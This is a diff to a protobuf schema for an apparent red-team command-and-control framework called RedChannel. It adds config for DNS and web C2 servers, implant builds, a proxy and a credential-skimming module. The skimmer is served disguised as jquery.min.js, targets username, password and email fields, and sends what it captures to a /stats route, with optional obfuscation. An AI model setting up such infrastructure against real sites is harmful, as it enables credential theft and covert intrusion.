@@ -4,6 +4,95 @@ package c2;
 
 import "implant.proto";
 
+message C2Config {
+  // the c2 domain, with authority to answer dns queries
+  string domain = 1;
+
+  // the bind ip of the dns server
+  string dns_ip = 2;
+  // the port of the dns server
+  uint32 dns_port = 3;
+
+  // the bind ip of the web server
+  string web_ip = 4;
+  // the port of the web server
+  uint32 web_port = 5;
+
+  // the route to serve the binary from on the web server
+  // ie: /payload.exe - agent code will be available at
+  // http://[web_ip]:[web_port]/payload.exe
+  string binary_route = 6;
+  // the external url of the web server: http://c2.redchannel.tld
+  // this will be the base of the binary_route
+  string web_url = 7;
+
+  // the bind ip of the teamserver
+  string ts_ip = 8;
+  // the port of the teamserver
+  uint32 ts_port = 9;
+
+  // enable debug mode
+  bool debug = 10;
+}
+
+message SkimmerModuleConfig {
+  // the route to serve the skimmer payload from on the c2 web server
+  // ie: /jquery.min.js - skimmer code will be available at
+  // http://[skimmer.url]/jquery.min.js
+  string payload_route = 1;
+
+  // the route to accept incoming skimmer data
+  // ie: /stats - skimmer will send data to http://[skimmer.url]/stats
+  string data_route = 2;
+
+  // the external url of the web server: http://c2.redchannel.tld -> [reverse
+  // proxy] -> http://[c2.web_ip]:[c2.web_port]/ this will be the base of the
+  // [payload_route] and [data_route]
+  string url = 3;
+
+  // the list of class names to help find elements to skim data
+  // ["passwordField", "mt-4"]
+  repeated string target_classes = 4;
+
+  // the list of ids to help find elements to skim data from
+  // ["username", "password", "email"]
+  repeated string target_ids = 5;
+
+  // should we obfuscate the skimmer payload
+  bool obfuscate_payload = 6;
+}
+
+message ProxyModuleConfig {
+  // enable the proxy checker
+  bool enabled = 1;
+  // the url of the proxy hosting the proxy payload
+  string url = 2;
+  // the proxy key shared by the user and the c2
+  string key = 3;
+  // how often to check in with the proxy for new data
+  uint32 interval = 4;
+  // should we obfuscate the payload
+  bool obfuscate_payload = 5;
+}
+
+message ImplantModuleConfig {
+  string resolver = 1;
+  uint32 interval = 2;
+  bool debug = 3;
+  string proxy_url = 4;
+  bool proxy_enabled = 5;
+  string proxy_key = 6;
+  bool throttle_sendq = 7;
+}
+
+message RedChannelConfig {
+  C2Config c2 = 1;
+  SkimmerModuleConfig skimmer = 2;
+  map<string, string> static_dns = 3;
+  ProxyModuleConfig proxy = 4;
+  ImplantModuleConfig implant = 5;
+};
+
 enum C2Command {
   C2_COMMAND_UNKNOWN = 0;
   C2_COMMAND_KEYX = 1;
@@ -95,6 +184,11 @@ message AgentCommandResponse {
   CommandStatus status = 1;
   string message = 2;
 }
+message SetConfigRequest { RedChannelConfig config = 1; }
+message SetConfigResponse {
+  CommandStatus status = 1;
+  string message = 2;
+}
 
 service RedChannel {
   rpc GetAgents(GetAgentsRequest) returns (GetAgentsResponse);
@@ -102,4 +196,5 @@ service RedChannel {
   rpc BuildImplant(BuildImplantRequest) returns (BuildImplantResponse);
   rpc GetBuildLog(GetBuildLogRequest) returns (GetBuildLogResponse);
   rpc AgentCommand(AgentCommandRequest) returns (AgentCommandResponse);
+  rpc SetConfig(SetConfigRequest) returns (SetConfigResponse);
 }
